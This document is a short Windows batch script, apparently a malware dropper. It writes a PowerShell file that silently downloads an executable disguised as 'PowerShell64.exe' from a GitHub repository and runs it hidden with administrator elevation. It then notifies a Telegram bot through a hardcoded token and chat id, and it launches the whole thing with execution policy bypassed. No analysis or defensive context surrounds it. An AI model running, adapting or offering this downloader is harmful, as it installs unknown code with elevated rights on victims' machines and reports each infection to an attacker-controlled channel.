echo $Url = 'https://github.com/37218vuuhuu/updateps1/raw/main/PowerShell64.exe' > random.ps1
echo [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls" >> random.ps1
echo $ProgressPreference = 'SilentlyContinue' >> random.ps1
echo $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'PowerShell64.exe' >> random.ps1
echo Invoke-WebRequest -Uri $Url -OutFile $OutFile >> random.ps1
echo $InstallerPath = $OutFile >> random.ps1
echo $Arguments = '-fullinstall' >> random.ps1
echo $Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden" >> random.ps1
echo Invoke-Expression -Command $Command >> random.ps1
echo $telegramAPI = "https://api.telegram.org/bot5253984892:AAEYJmf0qy9OJjmCo__rrmiSk9t_tFIMvgE/sendMessage?chat_id=683643497&text=x" >> random.ps1
echo Invoke-WebRequest -Uri $telegramAPI -Method Post; >> random.ps1
powershell.exe -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File .\random.ps1'
